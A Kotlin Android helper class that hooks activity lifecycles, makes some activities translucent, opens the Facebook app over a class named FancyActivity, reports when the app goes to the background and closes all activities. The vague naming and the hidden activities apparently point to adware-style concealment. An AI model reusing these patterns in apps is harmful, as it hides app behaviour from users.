package com.fast.sixth.man.other

import android.app.Activity
import android.app.Application
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import com.fast.sixth.man.R
import com.fast.sixth.man.listener.LifecycleActivityListener
import com.fast.sixth.man.other.info.FancySceneryNetwork
import kotlinx.coroutines.Job

/**
 * Date：2024/1/17
 * Describe:
 */
class ActivityLifeHelper(val context: Context) {

    companion object {
        var numActivity = 0
            set(value) {
                field = value
                if (value <= 0) {
                    field = 0
                    isAppResume = false
                    finishJob()
                } else {
                    mFinishJob?.cancel()
                }
            }

        var isAppResume = false
        private var mFinishJob: Job? = null
        private fun finishJob() {
            mFinishJob?.cancel()
            mFinishJob = LifecycleActivityListener.finishAllActivity()
        }

        fun isAppRCheckAllow(): Boolean {
            if (isAppResume) return false
            FancySceneryNetwork.postMai("isbackground")
            return true
        }
    }

    fun register(app: Application) {
        app.registerActivityLifecycleCallbacks(LifecycleActivityListener {
            activityOnCreate(it)
        })
    }

    private fun activityOnCreate(activity: Activity) {
        if (LifecycleActivityListener.isTarget()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                activity.setTranslucent(true)
            } else {
                activity.window.setBackgroundDrawableResource(R.color.fancy_color)
            }
        }
        isM(activity)
    }

    private fun isM(activity: Activity) {
        val name = activity::class.java.canonicalName ?: ""
        when (name) {
            "com.fast.sixth.man.listener.FancyActivity" -> {
                activity.startActivity(getJumpIntent(activity))
            }
        }
    }

    private fun getJumpIntent(context: Context, pkgName: String = "com.facebook.katana"): Intent {
        runCatching {
            val intent = Intent(Intent.ACTION_MAIN)
            intent.addCategory(Intent.CATEGORY_LAUNCHER)
            intent.setPackage(pkgName)
            val pm: PackageManager = context.packageManager
            val info = pm.queryIntentActivities(intent, 0)
            val launcherActivity = info.first().activityInfo.name
            intent.addCategory(Intent.CATEGORY_LAUNCHER)
            intent.setClassName(pkgName, launcherActivity)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            return intent
        }
        return Intent(Intent.ACTION_VIEW).apply {
            data = Uri.parse("https://play.google.com/store/apps/details?id=$pkgName")
        }
    }

}